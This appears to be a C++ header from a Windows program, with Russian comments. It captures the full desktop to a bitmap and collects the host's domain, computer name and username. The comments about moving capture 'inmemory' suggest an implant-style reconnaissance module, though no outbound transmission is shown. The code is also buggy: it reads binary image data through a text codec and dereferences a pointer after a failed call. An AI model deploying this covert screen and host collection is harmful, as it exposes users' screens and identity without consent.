#pragma once

#include "framework.h"

#include <wchar.h>
#include <DSRole.h>

#pragma comment(lib, "netapi32.lib")

#include <sstream>
#include <fstream>
#include <codecvt>

// А этот костыль этот самый скриншот считывает
std::wstring ReadBitmap(const WCHAR* filename)
{
    std::wifstream wif(filename);
    wif.imbue(std::locale(std::locale::empty(), new std::codecvt_utf8<wchar_t>));
    std::wstringstream wss;
    wss << wif.rdbuf();
    return wss.str();
}

// Костыль, чтобы получить фотку. Надо будет подумать как всё сделать inmemory
BOOL WINAPI SaveBitmap(const WCHAR* wPath)
{
    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    HGDIOBJ hTempBitmap;
    HBITMAP hBitmap;
    BITMAP bAllDesktops;
    HDC hDC, hMemDC;
    LONG lWidth, lHeight;
    BYTE* bBits = NULL;
    HANDLE hHeap = GetProcessHeap();
    DWORD cbBits, dwWritten = 0;
    HANDLE hFile;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));

    hDC = GetDC(NULL);
    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

    lWidth = bAllDesktops.bmWidth;
    lHeight = bAllDesktops.bmHeight;

    DeleteObject(hTempBitmap);

    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biPlanes = 1;
    biHeader.biWidth = lWidth;
    biHeader.biHeight = lHeight;

    bInfo.bmiHeader = biHeader;

    cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;

    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);


    hFile = CreateFileW(wPath, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hDC);
        DeleteObject(hBitmap);

        return FALSE;
    }
    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);
    FlushFileBuffers(hFile);
    CloseHandle(hFile);

    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);

    return TRUE;
}

LPWSTR getDomain() {
    DSROLE_PRIMARY_DOMAIN_INFO_BASIC* info;
    DWORD dw;

    dw = DsRoleGetPrimaryDomainInformation(NULL,
        DsRolePrimaryDomainInfoBasic,
        (PBYTE*)&info);
    if (dw != ERROR_SUCCESS)
    {
        wprintf(L"DsRoleGetPrimaryDomainInformation: %u\n", dw);
    }

    if (info->DomainNameDns == NULL)
    {
        DsRoleFreeMemory(info);
        return NULL;
    }
    else
    {
        const auto s = static_cast<rsize_t>(wcsnlen_s(info->DomainNameDns, MAX_PATH) + 10);
        auto res = new WCHAR[s];
        wcscpy_s(res, s, info->DomainNameDns);
        DsRoleFreeMemory(info);
        return res;
    }
}

LPWSTR getComputerName(DWORD& length) {
    length = MAX_PATH;
    auto domainNameBuf = new WCHAR[MAX_PATH];

    if (!GetComputerName(domainNameBuf, &length)) {
        length = static_cast<DWORD>(0);
        delete[] domainNameBuf;
        domainNameBuf = NULL;
    }

    return domainNameBuf;
}

LPWSTR getUsername(DWORD& length) {
    length = MAX_PATH;
    auto domainNameBuf = new WCHAR[MAX_PATH];

    if (!GetUserName(domainNameBuf, &length)) {
        length = static_cast<DWORD>(0);
        delete[] domainNameBuf;
        domainNameBuf = NULL;
    }

    return domainNameBuf;
}